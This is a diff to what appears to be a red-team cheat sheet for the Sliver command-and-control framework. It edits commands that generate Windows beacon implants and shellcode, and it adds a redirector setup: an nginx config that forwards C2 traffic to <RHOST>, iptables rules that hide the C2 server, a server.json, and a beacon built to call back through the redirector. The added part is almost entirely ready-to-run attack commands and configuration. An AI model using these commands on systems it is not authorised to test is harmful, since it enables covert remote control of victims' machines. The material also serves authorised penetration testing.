@@ -434,7 +434,7 @@ sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe -
 sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name <NAME> --save /PATH/TO/BINARY/
 sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name <NAME> --save /PATH/TO/BINARY/ -G
-sliver > generate beacon --http <LHOST>?proxy=http://<LHOST>:8080,<LHOST>?driver=wininet --os windows --arch amd64 --format shellcode --seconds 30 --jitter 3 --name <NAME> --save /tmp/<FILE>.bin -G --skip-symbols
+sliver > generate beacon --http <LHOST>?proxy=http://<LHOST>:8080,<LHOST>?driver=wininet --os windows --arch amd64 --format shellcode --seconds 30 --jitter 3 --name <NAME> --save /PATH/TO/BINARY/<FILE>.bin -G --skip-symbols
 ```
 
 ### Profiles, Listener and Stagers
@@ -640,6 +640,88 @@ sliver (NEARBY_LANGUAGE) > socks5 stop -i 1
 
 ```c
 sliver (NEARBY_LANGUAGE) > pivots tcp
-sliver (NEARBY_LANGUAGE) > generate --tcp-pivot <RHOST>:9898
+sliver (NEARBY_LANGUAGE) > generate --tcp-pivot <RHOST>:<RPORT>
 sliver (NEARBY_LANGUAGE) > pivots
+```
+
+### Redirector
+
+#### Nginx
+
+```c
+server {
+    listen 8443 default_server;
+    listen [::]:8443  default_server;
+
+    root /var/www/html;
+
+    index index.html index.htm index.nginx-debian.html;
+
+    server_name *.example.org;
+
+    location / {
+        try_files $uri $uri/ @c2;
+    }
+
+    location @c2 {
+        proxy_pass http://<RHOST>:8443;
+        proxy_redirect off;
+        proxy_ssl_verify off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    }
+}
+```
+
+#### Sliver Server Configuration
+
+##### iptables
+
+The `iptables` rules should only accept traffic for port `22/TCP` and from the `redirector`.
+
+```c
+$ /sbin/iptables -F
+$ /sbin/iptables -P INPUT DROP
+$ /sbin/iptables -P OUTPUT ACCEPT
+$ /sbin/iptables -I INPUT -i lo -j ACCEPT
+$ /sbin/iptables -A INPUT -p tcp --match multiport --dports 22 -j ACCEPT
+$ /sbin/iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+$ /sbin/iptables -A INPUT -s <RHOST> -j ACCEPT
+$ /sbin/iptables -A INPUT -j DROP
+$ /usr/sbin/netfilter-persistent save
+$ /usr/sbin/iptables-save > /root/custom-ip-tables-rules
+```
+
+##### server.json
+
+```c
+{
+    "daemon_mode": false,
+    "daemon": {
+        "host": "127.0.0.1",
+        "port": 31337
+    },
+    "logs": {
+        "level": 4,
+        "grpc_unary_payloads": false,
+        "grpc_stream_payloads": false,
+        "tls_key_logger": false
+    },
+    "jobs": {
+        "multiplayer": null
+    },
+    "watch_tower": null,
+    "go_proxy": ""
+```
+
+#### Example
+
+Create a `beacon` for the IP address of the `redirector`.
+
+```c
+sliver > generate beacon --http <RHOST>:8443 --os windows --arch amd64 --format exe --disable-sgn --seconds 30 --jitter 3 --save /PATH/TO/BINARY/
+```
+
+```c
+sliver > http --lport 8443
 ```
